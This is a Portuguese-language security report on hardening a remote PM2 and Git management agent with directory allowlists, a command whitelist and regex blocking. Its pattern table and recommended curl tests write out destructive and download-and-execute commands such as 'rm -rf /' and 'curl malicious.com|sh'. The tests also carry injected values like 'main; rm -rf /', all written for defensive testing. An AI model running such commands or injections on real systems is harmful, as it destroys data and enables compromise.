# RELATÓRIO DE SEGURANÇA — V1.1

**Data:** 04/09/2026  
**Escopo:** Implementação dos 3 pilares críticos de segurança para a V1

---

## 1. RESUMO EXECUTIVO

O Painel Central é uma plataforma que permite gerenciar remotamente serviços PM2 em múltiplas máquinas. O agente instalado nas máquinas recebe comandos via WebSocket e os executa localmente, o que representa um vetor de ataque significativo se não houver controles adequados.

Este relatório documenta a implementação de 3 camadas de segurança fundamentais para proteger a execução remota.

---

## 2. PILAR 1 — DIRETÓRIOS AUTORIZADOS

### 2.1 O que é

Cada agente pode possuir uma lista de diretórios que ele está autorizado a acessar. Se a lista estiver vazia, todos os diretórios são permitidos (backward compat).

### 2.2 Como funciona

```
┌─────────────────────────────────────────────────┐
│ COMANDO CHEGA (ex: GIT_STATUS)                  │
│   diretório: "C:\Projetos\malicioso"            │
└─────────────────────┬───────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────┐
│ VALIDAÇÃO DE DIRETÓRIO                          │
│                                                 │
│ Diretórios autorizados: ["C:\Projetos"]         │
│                                                 │
│ C:\Projetos\maliciouso                          │
│   → NÃO começa com "C:\Projetos"                │
│   → ❌ BLOQUEADO                                │
└─────────────────────────────────────────────────┘
```

### 2.3 Implementação

| Camada | Arquivo | O que faz |
|--------|---------|-----------|
| **Agente** | `apps/agente/src/index.ts` | Valida diretório contra lista antes de executar comando |
| **API** | `agentes.servico.ts` | CRUD de diretórios autorizados por agente |
| **API** | `agentes.controller.ts` | Endpoints `GET/POST /agentes/:id/diretorios` |
| **Banco** | `schema.prisma` | Campo `diretoriosAutorizados` (JSON array) |
| **Frontend** | `ambientes/[id]/page.tsx` | UI para adicionar/remover diretórios |

### 2.4 Endpoints

```
GET  /organizacoes/:orgId/agentes/:id/diretorios
POST /organizacoes/:orgId/agentes/:id/diretorios
Body: { "diretorios": ["C:\\Projetos", "/home/user/projetos"] }
```

### 2.5 Configuração do Agente (variável de ambiente)

```bash
# Modo legado (todos os diretórios permitidos)
AGENT_DIRECTORIES='[]'

# Com restrição
AGENT_DIRECTORIES='["C:\\Projetos","/home/user/projetos"]'
```

---

## 3. PILAR 2 — WHITELIST DE COMANDOS

### 3.1 O que é

Apenas tipos de comando pré-definidos são aceitos. Qualquer tentativa de enviar um tipo de comando não listado é rejeitada.

### 3.2 Comandos permitidos (API → Agente)

| Tipo de Comando | Descrição | Risco |
|----------------|-----------|-------|
| `OBTER_INFORMACOES_SISTEMA` | Info da máquina | Baixo |
| `OBTER_STATUS` | Status completo | Baixo |
| `LISTAR_PORTAS` | Portas em uso | Baixo |
| `INICIAR_SERVICO` | Start via PM2 | Médio |
| `PARAR_SERVICO` | Stop via PM2 | Médio |
| `REINICIAR_SERVICO` | Restart via PM2 | Médio |
| `PM2_SAVE` | Persistir processos | Baixo |
| `OBTER_STATUS_SERVICO` | Status PM2 | Baixo |
| `OBTER_LOGS_SERVICO` | Logs PM2 | Baixo |
| `OBTER_TODOS_PROCESSOS` | Lista PM2 | Baixo |
| `GIT_STATUS` | Status git | Baixo |
| `GIT_BRANCH` | Listar branches | Baixo |
| `GIT_PULL` | Pull remoto | Médio |
| `GIT_LOG` | Histórico commits | Baixo |
| `GIT_CHECKOUT` | Checkout commit | Médio |
| `GIT_CHECKOUT_BRANCH` | Checkout branch | Médio |

### 3.3 Bloqueios

| Tipo de Comando | Status |
|----------------|--------|
| `EXECUTAR_ARBITRARIO` | ❌ Nunca existiu |
| `SHELL_CUSTOM` | ❌ Não suportado |
| `INSTALAR_PACOTE` | ❌ Não suportado |
| Qualquer outro | ❌ Rejeitado com erro |

### 3.4 Implementação

**API (`agentes.controller.ts`):**
```typescript
private static readonly COMANDOS_PERMITIDOS: TipoComando[] = [
  'OBTER_INFORMACOES_SISTEMA',
  'OBTER_STATUS',
  // ... 14 tipos no total
];

// Validação antes de enviar ao agente
if (!AgentesController.COMANDOS_PERMITIDOS.includes(dados.tipo)) {
  throw new BadRequestException(`Tipo de comando não permitido: ${dados.tipo}`);
}
```

**Agente (`index.ts`):**
```typescript
switch (comando.tipo) {
  case 'INICIAR_SERVICO': { ... }
  case 'PARAR_SERVICO': { ... }
  // ... 16 cases
  default:
    throw new Error(`Comando não suportado: ${comando.tipo}`);
}
```

---

## 4. PILAR 3 — PROTEÇÃO CONTRA EXECUÇÃO ARBITRÁRIA

### 4.1 O que é

Mesmo com a whitelist, comandos individuais podem conter payloads maliciosos. O agente valida o conteúdo dos campos antes de executar.

### 4.2 Padrões proibidos

| Padrão Regex | Exemplo | Risco |
|-------------|---------|-------|
| `rm\s+-rf` | `rm -rf /` | Destruição de dados |
| `rmdir\s+\/s\s+\/q` | `rmdir /s /q C:\` | Destruição Windows |
| `format\s+[a-z]:` | `format C:` | Formatação de disco |
| `curl.*\|sh` | `curl malicious.com\|sh` | Download + execução |
| `wget.*\|bash` | `wget x.com\|bash` | Download + execução |
| `chmod\s+777` | `chmod 777 /etc/passwd` | Permissões perigosas |
| `>\s*\/` | `> /etc/hosts` | Escrita em sistema |

### 4.3 Validação de campos

| Campo | Validação | Exemplo inválido |
|-------|-----------|-----------------|
| `comando` | Regex anti-padrões proibidos | `rm -rf /` |
| `branch` | Sem caracteres `;&\|`$( etc. | `main; rm -rf /` |
| `hash` | Apenas hexadecimal | `abc123; ls` |
| `diretorio` | Deve estar na whitelist | `/etc/passwd` |

### 4.4 Fluxo completo de segurança

```
COMANDO CHEGA
    │
    ▼
┌─────────────────────────┐
│ 1. VALIDAR TIPO         │  Whitelist na API
│    (16 tipos permitidos) │  → Rejeita tipos inválidos
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ 2. VALIDAR DIRETÓRIO    │  Lista por agente
│    (se aplicável)       │  → Rejeita paths não autorizados
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ 3. VALIDAR CONTEÚDO     │  Regex + sanitização
│    (comando/branch/hash)│  → Rejeita payloads maliciosos
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ 4. EXECUTAR             │  Switch-case isolado
│    (apenas operações    │  → Nunca passa por shell genérico
│     seguras)            │
└─────────────────────────┘
```

---

## 5. VULNERABILIDADES RESTANTES (para V1.1+)

| Vulnerabilidade | Prioridade | Esforço | Descrição |
|----------------|------------|---------|-----------|
| **Tokens sem expiração** | Alta | Baixo | Tokens de agente não expiram |
| **Sem rate limiting** | Média | Baixo | API não limita taxa de comandos |
| **Sem audit log no agente** | Média | Médio | Agente não registra ações executadas |
| **Sem criptografia E2E** | Baixa | Alta | Comunicação depende de TLS externo |
| **Sem revogação imediata** | Baixa | Baixo | Desativar agente não invalida socket ativo |

---

## 6. CAMADAS DE SEGURANÇA — RESUMO VISUAL

```
                        ┌──────────────────────┐
                        │      USUÁRIO         │
                        │   (Browser/WebApp)   │
                        └──────────┬───────────┘
                                   │
                          Autenticação JWT
                                   │
                        ┌──────────▼───────────┐
                        │     API CENTRAL      │
                        │                      │
                        │  ✅ Whitelist de      │
                        │     comandos (16)    │
                        │  ✅ Timeout máximo    │
                        │     (30 segundos)    │
                        │  ✅ Validação de      │
                        │     organização      │
                        └──────────┬───────────┘
                                   │
                        WebSocket (token único)
                                   │
                        ┌──────────▼───────────┐
                        │      AGENTE          │
                        │                      │
                        │  ✅ Diretórios        │
                        │     autorizados      │
                        │  ✅ Validação de      │
                        │     conteúdo         │
                        │  ✅ Padrões proibidos │
                        │  ✅ Switch-case       │
                        │     isolado          │
                        └──────────┬───────────┘
                                   │
                                   ▼
                              PM2 / Git / OS
```

---

## 7. TESTES RECOMENDADOS

### 7.1 Teste de diretórios autorizados
```bash
# Deve funcionar (diretório autorizado)
curl -X POST http://localhost:4001/organizacoes/.../agentes/.../comandos \
  -H "Authorization: Bearer <token>" \
  -d '{"tipo":"GIT_STATUS","dados":{"diretorio":"C:\\Projetos\\meu-app"}}'

# Deve falhar (diretório não autorizado)
curl -X POST http://localhost:4001/organizacoes/.../agentes/.../comandos \
  -d '{"tipo":"GIT_STATUS","dados":{"diretorio":"C:\\Windows\\System32"}}'
```

### 7.2 Teste de whitelist
```bash
# Deve funcionar
curl -d '{"tipo":"INICIAR_SERVICO",...}' 

# Deve falhar (tipo não existe)
curl -d '{"tipo":"EXECUTAR_SHELL","dados":{"comando":"rm -rf /"}}'
```

### 7.3 Teste de conteúdo
```bash
# Deve falhar (comando proibido)
curl -d '{"tipo":"INICIAR_SERVICO","dados":{"comando":"rm -rf /"}}'

# Deve falhar (branch com injeção)
curl -d '{"tipo":"GIT_PULL","dados":{"branch":"main; rm -rf /"}}'

# Deve falhar (hash não hexadecimal)
curl -d '{"tipo":"GIT_CHECKOUT","dados":{"hash":"abc; ls"}}'
```

---

## 8. CONCLUSÃO

A V1.1 implementa as 3 camadas de segurança solicitadas:

1. **Diretórios autorizados** — Restringe paths acessíveis por agente
2. **Whitelist de comandos** — Apenas 16 operações pré-definidas
3. **Proteção contra execução arbitrária** — Validação de conteúdo + regex anti-padrões

Estas camadas eliminam os vetores de ataque mais críticos para uma ferramenta de gerenciamento remoto, mantendo a usabilidade para o caso de uso legítimo.

---

*Documento gerado automaticamente em 04/09/2026*
